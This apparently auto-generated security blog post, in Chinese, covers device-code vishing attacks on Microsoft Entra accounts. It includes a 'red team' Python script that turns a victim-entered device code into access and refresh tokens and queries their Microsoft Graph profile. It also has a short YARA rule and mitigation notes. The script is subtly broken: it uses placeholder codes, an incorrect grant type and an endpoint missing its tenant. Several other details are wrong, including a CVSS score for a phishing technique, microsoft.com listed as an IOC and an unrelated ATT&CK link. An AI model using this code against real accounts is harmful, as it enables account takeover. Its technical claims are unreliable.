---
layout: post
title:  "Hackers target Microsoft Entra accounts in device code vishing attacks"
date:   2026-02-19 12:47:52 +0000
categories: [security]
severity: critical
---

# 🚨 解析 OAuth 2.0 Device Authorization 流程中的安全漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Account Takeover
> * **關鍵技術**: OAuth 2.0 Device Authorization, Vishing, Social Engineering

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: OAuth 2.0 Device Authorization 流程中的安全漏洞，允許攻擊者使用合法的 OAuth client ID 和 device authorization 流程來 trick 受害者進行身份驗證。
* **攻擊流程圖解**:
  1. 攻擊者獲得合法的 OAuth client ID
  2. 攻擊者生成 device_code 和 user_code
  3. 攻擊者誘騙受害者訪問 Microsoft device authentication 頁面並輸入 user_code
  4. 受害者進行身份驗證和 MFA 驗證
  5. 攻擊者使用 device_code 獲取 refresh token 和 access token
  6. 攻擊者使用 access token 存取受害者的 Microsoft 服務
* **受影響元件**: Microsoft Entra, Microsoft 365, Azure AD

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 合法的 OAuth client ID, 受害者的信任
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 合法的 OAuth client ID
    client_id = "your_client_id"
    
    # 生成 device_code 和 user_code
    device_code = "your_device_code"
    user_code = "your_user_code"
    
    # 誘騙受害者訪問 Microsoft device authentication 頁面
    print("請訪問以下頁面並輸入 user_code：")
    print("https://microsoft.com/devicelogin")
    
    # 受害者進行身份驗證和 MFA 驗證
    # 攻擊者使用 device_code 獲取 refresh token 和 access token
    refresh_token = requests.post("https://login.microsoftonline.com/oauth2/v2.0/token", data={
        "grant_type": "device_code",
        "device_code": device_code,
        "client_id": client_id
    }).json()["refresh_token"]
    
    access_token = requests.post("https://login.microsoftonline.com/oauth2/v2.0/token", data={
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": client_id
    }).json()["access_token"]
    
    # 攻擊者使用 access token 存取受害者的 Microsoft 服務
    print("存取受害者的 Microsoft 服務：")
    print(requests.get("https://graph.microsoft.com/v1.0/me", headers={
        "Authorization": "Bearer " + access_token
    }).json())
    
    ```
* **繞過技術**: 使用合法的 OAuth client ID 和 device authorization 流程來 trick 受害者進行身份驗證

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | microsoft.com |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Microsoft_Device_Authorization_Attack {
        meta:
            description = "Microsoft Device Authorization Attack"
            author = "Your Name"
        strings:
            $device_code = "device_code="
            $user_code = "user_code="
        condition:
            $device_code and $user_code
    }
    
    ```
* **緩解措施**:
  1. 封鎖不合法的 OAuth client ID
  2. 監控 device authorization 流程中的異常行為
  3. 強制使用 MFA 驗證

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth 2.0 Device Authorization**: 一種允許設備存取受保護資源的授權流程
* **Vishing**: 一種使用語音電話的社會工程攻擊
* **Social Engineering**: 一種使用心理操縱的攻擊手法

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hackers-target-microsoft-entra-accounts-in-device-code-vishing-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1620/)


